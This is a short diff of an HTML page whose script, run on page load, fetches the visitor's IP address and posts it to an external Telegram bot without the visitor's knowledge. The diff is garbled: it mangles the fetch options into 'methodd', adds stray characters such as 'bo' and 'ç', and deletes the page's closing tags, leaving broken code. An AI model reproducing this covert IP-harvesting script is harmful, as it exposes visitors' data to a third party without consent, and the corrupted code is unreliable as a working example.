@@ -23,8 +23,7 @@
           const ip = data.ip;
 
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: {
+            methodd   headers: {
               "Content-Type": "application/json"
             },
             body: JSON.stringify({
@@ -35,10 +34,8 @@
         } catch (e) {
           console.error("IP gönderilemedi:", e);
         }
-      };
+      };bo
     </script>
   </head>
   <body onload="checkPassword(); getAndSendIP();">
-    <h1>Ayık ol</h1>
-  </body>
-</html>
+ç
